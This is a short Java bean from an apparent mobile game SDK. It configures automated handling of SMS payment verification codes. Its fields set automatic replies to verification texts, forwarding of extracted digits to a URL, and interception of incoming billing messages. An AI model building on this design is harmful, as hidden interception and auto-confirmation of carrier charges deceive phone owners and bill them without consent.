package mobi.zty.sdk.game.bean;

/**
 * 支付所需验证码部分的信息
 * @author Administrator
 *
 */
public class VerifyInfo {

	/**
	 *0代表回复固定的 内容 1代表动态读取对应长度的数字 并回复 2 读取动态固定长度的数字回传  3(代表1、2都要执行)
	 */
	public int vertifyType = 0;
	/**
	 * 回传验证码的url
	 */
	public String vertifyUrl = "";
	
	/**
	 * 当vertify_type=0的时候监听到验证码短息 直接回复该内容
	 */
	public String fixedContent = "";
	
	/**
	 * 当vertify_type=1 时  验证码需要读取的长度
	 */
	public int digitalLength = 3;
	
	/**
	 * 验证码的下行端口
	 */
	public String vertifyNum = "";
	
	/**
	 * 回复验证码的上行端口
	 */
	public String confimNum = "";
	
	/**
	 * 该计费 下行需要拦截的 内容
	 */
	public String[] interceptContent;
	
}
